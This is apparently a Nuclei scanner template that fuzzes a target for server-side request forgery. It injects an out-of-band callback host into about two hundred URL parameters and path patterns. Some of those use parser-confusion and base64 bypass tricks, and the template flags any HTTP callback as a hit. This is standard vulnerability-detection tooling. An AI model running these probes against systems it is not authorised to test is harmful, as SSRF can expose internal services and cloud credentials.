id: ssrf-fuzzer

info:
  name: ssrf-fuzzer
  author: SSRF-fuzzer
  reference: https://infosecwriteups.com/ssrf-leads-to-access-aws-metadata-21952c220aeb
  severity: high
  tags: ssrf,generic
  
http:
  - method: GET
    path:
      - "{{BaseURL}}/?/https://{{interactsh-url}}"
      - "{{BaseURL}}/#/https://{{interactsh-url}}"
      - "{{BaseURL}}/-/https://{{interactsh-url}}"
      - "{{BaseURL}}/?access=https://{{interactsh-url}}"
      - "{{BaseURL}}/?adm=https://{{interactsh-url}}"
      - "{{BaseURL}}/?admin=https://{{interactsh-url}}"
      - "{{BaseURL}}/?callback=https://{{interactsh-url}}"
      - "{{BaseURL}}/?callback={{interactsh-url}}"
      - "{{BaseURL}}/?clone=https://{{interactsh-url}}"
      - "{{BaseURL}}/?config=https://{{interactsh-url}}"
      - "{{BaseURL}}/?consumerUri={{interactsh-url}}"
      - "{{BaseURL}}/?continue=https://{{interactsh-url}}"
      - "{{BaseURL}}/?create=https://{{interactsh-url}}"
      - "{{BaseURL}}/?data=https://{{interactsh-url}}"
      - "{{BaseURL}}/?dbg=https://{{interactsh-url}}"
      - "{{BaseURL}}/?debug=https://{{interactsh-url}}"
      - "{{BaseURL}}/?delete=https://{{interactsh-url}}"
      - "{{BaseURL}}/?dest=https://{{interactsh-url}}"
      - "{{BaseURL}}/?dir=https://{{interactsh-url}}"
      - "{{BaseURL}}/?disable=https://{{interactsh-url}}"
      - "{{BaseURL}}/?doc=https://{{interactsh-url}}"
      - "{{BaseURL}}/?document=https://{{interactsh-url}}"
      - "{{BaseURL}}/?domain=https://{{interactsh-url}}"
      - "{{BaseURL}}/?downloadUrl=https://{{interactsh-url}}"
      - "{{BaseURL}}/?edit=https://{{interactsh-url}}"
      - "{{BaseURL}}/?enable=https://{{interactsh-url}}"
      - "{{BaseURL}}/?exec=https://{{interactsh-url}}"
      - "{{BaseURL}}/?execute=https://{{interactsh-url}}"
      - "{{BaseURL}}/?export={{interactsh-url}}"
      - "{{BaseURL}}/?feed=https://{{interactsh-url}}"
      - "{{BaseURL}}/?file=https://{{interactsh-url}}"
      - "{{BaseURL}}/?filename=https://{{interactsh-url}}"
      - "{{BaseURL}}/?folder=https://{{interactsh-url}}"
      - "{{BaseURL}}/?grant=https://{{interactsh-url}}"
      - "{{BaseURL}}/?host=https://{{interactsh-url}}"
      - "{{BaseURL}}/?html=https://{{interactsh-url}}"
      - "{{BaseURL}}/?image_proxy=https://{{interactsh-url}}"
      - "{{BaseURL}}/?img=https://{{interactsh-url}}"
      - "{{BaseURL}}/?import={{interactsh-url}}"
      - "{{BaseURL}}/?link={{interactsh-url}}"
      - "{{BaseURL}}/?load=https://{{interactsh-url}}"
      - "{{BaseURL}}/?make=https://{{interactsh-url}}"
      - "{{BaseURL}}/?media-link={{interactsh-url}}"
      - "{{BaseURL}}/?modify=https://{{interactsh-url}}"
      - "{{BaseURL}}/?navigation=https://{{interactsh-url}}"
      - "{{BaseURL}}/?next=https://{{interactsh-url}}"
      - "{{BaseURL}}/?next_url={{interactsh-url}}"
      - "{{BaseURL}}/?open=https://{{interactsh-url}}"
      - "{{BaseURL}}/?out=https://{{interactsh-url}}"
      - "{{BaseURL}}/?page=https://{{interactsh-url}}"
      - "{{BaseURL}}/?path=https://{{interactsh-url}}"
      - "{{BaseURL}}/?pg=https://{{interactsh-url}}"
      - "{{BaseURL}}/?php_path=https://{{interactsh-url}}"
      - "{{BaseURL}}/?port=https://{{interactsh-url}}"
      - "{{BaseURL}}/?proxy=https:{{interactsh-url}}"
      - "{{BaseURL}}/?proxy={{interactsh-url}}"
      - "{{BaseURL}}/?redirect=https://{{interactsh-url}}"
      - "{{BaseURL}}/?rename=https://{{interactsh-url}}"
      - "{{BaseURL}}/?report=https://{{interactsh-url}}"
      - "{{BaseURL}}/?reset=https://{{interactsh-url}}"
      - "{{BaseURL}}/?return=https://{{interactsh-url}}"
      - "{{BaseURL}}/?root=https://{{interactsh-url}}"
      - "{{BaseURL}}/?shell=https://{{interactsh-url}}"
      - "{{BaseURL}}/?shorts=https:{{interactsh-url}}"
      - "{{BaseURL}}/?shorts={{interactsh-url}}"
      - "{{BaseURL}}/?show=https://{{interactsh-url}}"
      - "{{BaseURL}}/?site=https://{{interactsh-url}}"
      - "{{BaseURL}}/?srcUrl=https:{{interactsh-url}}"
      - "{{BaseURL}}/?srcUrl={{interactsh-url}}"
      - "{{BaseURL}}/?style=https://{{interactsh-url}}"
      - "{{BaseURL}}/?test=https://{{interactsh-url}}"
      - "{{BaseURL}}/?to=https://{{interactsh-url}}"
      - "{{BaseURL}}/?toggle=https://{{interactsh-url}}"
      - "{{BaseURL}}/?uri=https://{{interactsh-url}}"
      - "{{BaseURL}}/?url=https://{{interactsh-url}}"
      - "{{BaseURL}}/?url=https:{{Hostname}}@{{interactsh-url}}"
      - "{{BaseURL}}/?url=https:{{interactsh-url}}"
      - "{{BaseURL}}/?url=https:{{{interactsh-url}}#{{Hostname}}"
      - "{{BaseURL}}/?url=https:{{{interactsh-url}}\\@{{Hostname}}"
      - "{{BaseURL}}/?url={{Hostname}}\\@{{interactsh-url}}"
      - "{{BaseURL}}/?val=https://{{interactsh-url}}"
      - "{{BaseURL}}/?validate=https://{{interactsh-url}}"
      - "{{BaseURL}}/?view=https://{{interactsh-url}}"
      - "{{BaseURL}}/?website_url={{interactsh-url}}"
      - "{{BaseURL}}/?window=https://{{interactsh-url}}"
      - "{{BaseURL}}/_next/image?url={{interactsh-url}}"
      - "{{BaseURL}}/ajax/{{interactsh-url}}"
      - "{{BaseURL}}/api/proxy/https://{{interactsh-url}}"
      - "{{BaseURL}}/api/v1/download-url?url={{interactsh-url}}"
      - "{{BaseURL}}/api/v1/download?url={{interactsh-url}}"
      - "{{BaseURL}}/api/v1/file?filename={{interactsh-url}}"
      - "{{BaseURL}}/api/v1/file?url={{interactsh-url}}"
      - "{{BaseURL}}/api/v1/files?filename={{interactsh-url}}"
      - "{{BaseURL}}/api/v1/files?url={{interactsh-url}}"
      - "{{BaseURL}}/api/v1/image_proxy?url=https://{{interactsh-url}}"
      - "{{BaseURL}}/api/v1/images?name={{interactsh-url}}"
      - "{{BaseURL}}/api/v1/images?url={{interactsh-url}}"
      - "{{BaseURL}}/api/v1/proxy/https://{{interactsh-url}}"
      - "{{BaseURL}}/api/v2/image_proxy?url=https://{{interactsh-url}}"
      - "{{BaseURL}}/api/v2/proxy/https://{{interactsh-url}}"
      - "{{BaseURL}}/api/v3/image_proxy?url=https://{{interactsh-url}}"
      - "{{BaseURL}}/api/v3/proxy/https://{{interactsh-url}}"
      - "{{BaseURL}}/api/{{interactsh-url}}"
      - "{{BaseURL}}/cdn-cgi/image/width/https://{{interactsh-url}}"
      - "{{BaseURL}}/cdn/{{interactsh-url}}"
      - "{{BaseURL}}/cloud/{{interactsh-url}}"
      - "{{BaseURL}}/content/{{interactsh-url}}"
      - "{{BaseURL}}/cors_proxy/https://{{interactsh-url}}"
      - "{{BaseURL}}/cors_proxy/{{interactsh-url}}"
      - "{{BaseURL}}/crossdomain.php?url={{interactsh-url}}"
      - "{{BaseURL}}/data/{{interactsh-url}}"
      - "{{BaseURL}}/docs/{{interactsh-url}}"
      - "{{BaseURL}}/domain/{{interactsh-url}}"
      - "{{BaseURL}}/download/{{interactsh-url}}"
      - "{{BaseURL}}/export/{{interactsh-url}}"
      - "{{BaseURL}}/file/{{interactsh-url}}"
      - "{{BaseURL}}/files/{{interactsh-url}}"
      - "{{BaseURL}}/host/{{interactsh-url}}"
      - "{{BaseURL}}/hoster/{{interactsh-url}}"
      - "{{BaseURL}}/hosting/{{interactsh-url}}"
      - "{{BaseURL}}/hosts/{{interactsh-url}}"
      - "{{BaseURL}}/http/services/{{interactsh-url}}"
      - "{{BaseURL}}/http/url/{{interactsh-url}}"
      - "{{BaseURL}}/http/{{interactsh-url}}"
      - "{{BaseURL}}/https://{{interactsh-url}}"
      - "{{BaseURL}}/image/proxy/{{interactsh-url}}"
      - "{{BaseURL}}/image/{{interactsh-url}}"
      - "{{BaseURL}}/imageProxy/https://{{interactsh-url}}"
      - "{{BaseURL}}/image_proxy?url=https://{{interactsh-url}}"
      - "{{BaseURL}}/imageproxy/220,/https://{{interactsh-url}}/"
      - "{{BaseURL}}/imageproxy/220,fit/https://{{interactsh-url}}/"
      - "{{BaseURL}}/imageproxy/https://{{interactsh-url}}/images/0737.jpg"
      - "{{BaseURL}}/images/proxy/{{interactsh-url}}"
      - "{{BaseURL}}/images/url/{{interactsh-url}}"
      - "{{BaseURL}}/images/{{interactsh-url}}"
      - "{{BaseURL}}/import/{{interactsh-url}}"
      - "{{BaseURL}}/int/{{interactsh-url}}"
      - "{{BaseURL}}/intern/{{interactsh-url}}"
      - "{{BaseURL}}/internal/{{interactsh-url}}"
      - "{{BaseURL}}/internal_proxy/http/{{interactsh-url}}"
      - "{{BaseURL}}/internal_website/{{interactsh-url}}"
      - "{{BaseURL}}/loc/{{interactsh-url}}"
      - "{{BaseURL}}/location/{{interactsh-url}}"
      - "{{BaseURL}}/next/{{interactsh-url}}"
      - "{{BaseURL}}/next_to/{{interactsh-url}}"
      - "{{BaseURL}}/proxies/{{interactsh-url}}"
      - "{{BaseURL}}/proxy-post/{{interactsh-url}}"
      - "{{BaseURL}}/proxy.aspx?url={{interactsh-url}}"
      - "{{BaseURL}}/proxy.jsp?url={{interactsh-url}}"
      - "{{BaseURL}}/proxy.php?url={{base64({{interactsh-url}})}}"
      - "{{BaseURL}}/proxy.php?url={{interactsh-url}}"
      - "{{BaseURL}}/proxy.stream/{{interactsh-url}}"
      - "{{BaseURL}}/proxy.stream?origin={{interactsh-url}}"
      - "{{BaseURL}}/proxy/200,/https://{{interactsh-url}}/"
      - "{{BaseURL}}/proxy/220,/https://{{interactsh-url}}/"
      - "{{BaseURL}}/proxy/301,/https://{{interactsh-url}}/"
      - "{{BaseURL}}/proxy/302,/https://{{interactsh-url}}/"
      - "{{BaseURL}}/api/v1/proxy/?url=http://{{interactsh-url}}"
      - "{{BaseURL}}/api/v2/proxy/?url=http://{{interactsh-url}}"
      - "{{BaseURL}}/api/v3/proxy/?url=http://{{interactsh-url}}"
      - "{{BaseURL}}/proxy/?url=https://{{interactsh-url}}"
      - "{{BaseURL}}/proxy?url=https://{{interactsh-url}}"
      - "{{BaseURL}}/proxy_url/https://{{interactsh-url}}"
      - "{{BaseURL}}/proxy/https://{{interactsh-url}}"
      - "{{BaseURL}}/proxy/internal/{{interactsh-url}}"
      - "{{BaseURL}}/internal/proxy/{{interactsh-url}}"
      - "{{BaseURL}}/proxy/internal_website/{{interactsh-url}}"
      - "{{BaseURL}}/proxy/{{interactsh-url}}"
      - "{{BaseURL}}/proxy?url=http%3a//{{interactsh-url}}"
      - "{{BaseURL}}/request/{{interactsh-url}}"
      - "{{BaseURL}}/rest/{{interactsh-url}}"
      - "{{BaseURL}}/restart/{{interactsh-url}}"
      - "{{BaseURL}}/server/{{interactsh-url}}"
      - "{{BaseURL}}/server_proxy/{{interactsh-url}}"
      - "{{BaseURL}}/service/proxy/{{interactsh-url}}"
      - "{{BaseURL}}/services/proxy/{{interactsh-url}}"
      - "{{BaseURL}}/services/{{interactsh-url}}"
      - "{{BaseURL}}/source/{{interactsh-url}}"
      - "{{BaseURL}}/src/{{interactsh-url}}"
      - "{{BaseURL}}/start/{{interactsh-url}}"
      - "{{BaseURL}}/stop/{{interactsh-url}}"
      - "{{BaseURL}}/stream/{{interactsh-url}}"
      - "{{BaseURL}}/to/{{interactsh-url}}"
      - "{{BaseURL}}/upload/{{interactsh-url}}"
      - "{{BaseURL}}/url/proxy/http/{{interactsh-url}}"
      - "{{BaseURL}}/url/{{interactsh-url}}"
      - "{{BaseURL}}/web-services/{{interactsh-url}}"
      - "{{BaseURL}}/hook/{{interactsh-url}}"
      - "{{BaseURL}}/webhook/{{interactsh-url}}"
      - "{{BaseURL}}/webmanager/{{interactsh-url}}"
      - "{{BaseURL}}/websocket/{{interactsh-url}}"
      - "{{BaseURL}}/socket/{{interactsh-url}}"
      - "{{BaseURL}}/{{base64('{{interactsh-url}}/token#.css')}}"
      - "{{BaseURL}}/{{base64('{{interactsh-url}}/token#.html')}}"
      - "{{BaseURL}}/{{base64('{{interactsh-url}}/token#.js')}}"
      - "{{BaseURL}}/{{base64('{{interactsh-url}}/token#.json')}}"
      - "{{BaseURL}}/{{base64('{{interactsh-url}}/token#.png')}}"
      - "{{BaseURL}}/{{base64('{{interactsh-url}}/token')}}"
      - "{{BaseURL}}/https://{{interactsh-url}}"
      - "{{BaseURL}}/{{interactsh-url}}/poc.svg"
      - "{{BaseURL}}/{{interactsh-url}}/token#.css"
      - "{{BaseURL}}/{{interactsh-url}}/token#.html"
      - "{{BaseURL}}/{{interactsh-url}}/token#.js"
      - "{{BaseURL}}/{{interactsh-url}}/token#.json"
      - "{{BaseURL}}/{{interactsh-url}}/token#.png"
      
    stop-at-first-match: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"